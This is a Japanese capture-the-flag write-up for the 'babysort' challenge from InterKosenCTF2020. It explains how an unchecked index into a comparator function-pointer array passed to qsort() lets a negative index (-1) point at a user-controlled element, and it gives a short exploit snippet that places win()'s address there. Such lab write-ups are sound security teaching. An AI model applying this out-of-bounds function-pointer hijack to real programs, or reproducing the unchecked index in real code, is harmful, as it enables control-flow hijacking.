# babysort - InterKosenCTF2020

この問題は`qsort()`関数の第四引数の関数ポインタに`win()`関数を指定することが目的。

## 解法

`qsort()`の定義は以下のようになっている。
```c
#include <stdlib.h>

void qsort(void *base, size_t nel, size_t width,
           int (*compar)(const void *, const void *));
```

次に`SortExperiment`構造体で「要素」と「比較をする関数ポインタを格納する配列」がまとめられている。
```c
//void*を２つ受け取ってint型を返す(*SORTFUNC)
typedef int (*SORTFUNC)(const void*, const void*);

typedef struct {
  long elm[5];
  SORTFUNC cmp[2];
} SortExperiment;

...

int cmp_asc(const void *a, const void *b) { return *(long*)a - *(long*)b; }
int cmp_dsc(const void *a, const void *b) { return *(long*)b - *(long*)a; }

int main(void) {
  SortExperiment se = {.cmp = {cmp_asc, cmp_dsc}};
  ...
```

このプログラムでは比較関数を選択する処理に、
入力されたインデックスを確認していないので範囲外参照ができる脆弱性がある。
```c
  /* sort */
  printf("[0] Ascending / [1] Descending: ");
  if (scanf("%d", &i) != 1) exit(1);
  qsort(se.elm, 5, sizeof(long), se.cmp[i]);
```

また、メモリ上では`elm[4]`と`cmp[-1]`が等しいので、`elm[4]`に`win()`関数ポインタを置き、
インデックスに`-1`を指定することで`win()`関数を呼び出す。

```python
set_elm(b"1")
set_elm(b"3")
set_elm(b"2")
set_elm(b"5")
set_elm(b(str(e.sym["win"])))

call(b"-1")
```
